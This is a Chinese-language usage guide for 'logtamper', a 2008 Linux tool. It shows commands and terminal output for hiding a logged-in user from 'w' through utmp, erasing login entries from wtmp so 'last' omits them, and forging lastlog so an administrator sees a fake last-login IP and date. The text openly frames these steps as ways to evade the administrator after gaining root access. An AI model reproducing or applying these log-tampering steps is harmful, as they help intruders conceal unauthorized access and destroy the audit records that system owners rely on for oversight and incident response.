logtamper version1.1
logtamper是一款*修改*linux日志的工具，在修改日志文件的同时，能够保留被修改文件的时间信息(atime没改，觉得没必要)。

[root@localhost logtamper]# ./logtamper-static
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

logtamper [-f utmp_filename] -h username hostname               hide username connected from hostname
logtamper [-f wtmp_filename] -w username hostname               erase username from hostname in wtmp file
logtamper [-f lastlog_filename] -m username hostname ttyname YYYY[:MM[:DD[:hh[:mm[:ss]]]]]  modify lastlog info

-f 选项：用于指定要修改的文件的路径的，是个可选项。由于不同系统的日志存放路径不一样，可以手工指定。
默认的日志存放地点是：
#define UTMPFILE "/var/run/utmp"
#define WTMPFILE "/var/log/wtmp"
#define LASTLOGFILE "/var/log/lastlog"

-h 选项: 有时候你和管理员同时在线，管理员w一下就能看到你了。使用-h选项用户躲避管理员w查看，如下：

[root@localhost logtamper]# w
 21:27:25 up 5 days, 13:48,  4 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                Fri14   18:24m  0.33s  0.33s -bash
root     pts/3    192.168.80.1     21:21    6:22   0.04s  0.04s -bash
root     pts/2    192.168.80.1     21:06    0.00s  0.13s  0.00s w
root     pts/4    192.168.80.1     21:21    5:52   0.03s  0.03s -bash

我们是从192.168.80.1机器连上来的，现在隐藏下：

[root@localhost logtamper]# ./logtamper-static -h root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Seems you're invisible Now...Check it out!

[root@localhost logtamper]# w
 21:27:46 up 5 days, 13:48,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                Fri14   18:24m  0.33s  0.33s -bash
[root@localhost logtamper]#

-w 选项:用于清除你的登录日志，现在上的linux日志清除工具做的很粗燥啊，这个可以指定清除某些hostname过来的机器。

[root@localhost logtamper]# last
root     tty1                          Wed Oct  1 21:30 - 21:30  (00:00)
root     pts/4        192.168.80.1     Wed Oct  1 21:21   still logged in
root     pts/3        192.168.80.1     Wed Oct  1 21:21   still logged in

wtmp begins Wed Oct  1 06:01:46 2008

清除192.168.80.1的登录日志：

[root@localhost logtamper]# ./logtamper-static -w root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Aho,you are now invisible to last...Check it out!
[root@localhost logtamper]# last
root     tty1                          Wed Oct  1 21:30 - 21:30  (00:00)

wtmp begins Wed Oct  1 06:01:46 2008
[root@localhost logtamper]#

-m 选项:用于修改上次登录地点，我们使用ssh登录的时候可能会注意到这点
login as: root
Sent username "root"
root@192.168.80.128's password:
Last login: Wed Oct  1 21:31:40 2008 from 192.168.80.45
[root@localhost ~]#

如果不修改lastlog的话，管理员下次登录就会提示从我们的机器IP登录。使用-m选项可以编辑这个选项：

[root@localhost logtamper]# ./logtamper-static -m root 1.2.3.4 tty10 2008:1:1:1:1:1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Aho, now you never come here before...Check it out!
[root@localhost logtamper]#
当然，这只是个举例，在使用中各位请根据具体信息修改，下次管理员登录，登录界面就成了

login as: root
Sent username "root"
root@192.168.80.128's password:
Last login: Tue Jan  1 01:01:01 2008 from 1.2.3.4
[root@localhost ~]#


恩，就这么多了，有什么问题，发邮件 evil.xi4oyu@gmail.com















